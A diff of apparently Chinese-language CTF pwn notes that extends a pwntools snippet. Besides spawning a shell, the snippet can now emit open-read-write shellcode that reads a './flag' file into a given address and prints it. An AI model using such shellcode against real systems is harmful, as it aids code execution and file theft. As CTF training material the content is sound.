@@ -11,8 +11,16 @@
 from pwn import *
 arch=input("arch? i386/amd64: ")
 context(log_level = 'debug', arch = arch[:-1], os = 'linux')
-shellcode=asm(shellcraft.sh())
-print(shellcode)
+choice=input("shell/orw: ")
+if choice=="shell":
+    shellcode=asm(shellcraft.sh())
+    print(shellcode)
+else:
+    mmap_addr = int(input("请输入16进制的读入地址: ")[:-1],16)
+    shellcode = shellcraft.open('./flag')
+    shellcode += shellcraft.read(3, mmap_addr, 0x30)
+    shellcode += shellcraft.write(1, mmap_addr, 0x30)
+    print(asm(shellcode))
 ```
 
 6. pwn 栈题模板
